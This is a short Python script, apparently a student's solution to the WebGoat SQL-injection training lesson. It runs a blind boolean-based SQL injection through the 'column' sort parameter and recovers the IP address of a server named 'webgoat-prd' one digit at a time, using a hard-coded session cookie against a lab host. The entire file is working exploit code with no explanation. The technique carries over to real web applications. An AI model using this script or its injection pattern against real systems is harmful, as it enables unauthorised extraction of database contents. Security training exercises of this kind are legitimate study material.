import requests
import json

header = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest'
}

cookies = {
    'JSESSIONID': '9643C4B44CA08F82EBD0753F4E40D5DE'
}
rememberID = ''
for i in range(1, 16):
    for x in range(10):
        if i % 4 == 0:
            rememberID += '.'
            break
        sql_q = "(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-prd' AND substring(ip,1,%s) = '%s')IS NOT NULL THEN hostname ELSE id END)" % (i, rememberID + str(x))
        params = {
            'column': sql_q,
        }
        response = requests.get('http://jupyterhub.stud.hshl.net:8080/WebGoat/SqlInjection/servers', params=params,
                                headers=header, cookies=cookies)
        if response.status_code == 403:
            print('Der Server hasst mich')
        else:
            json_data = json.loads(response.text)
            if json_data[0]['id'] is not '1':
                rememberID += str(x)
                print(rememberID)
                break
            #print('Not quite right: %s' % x)
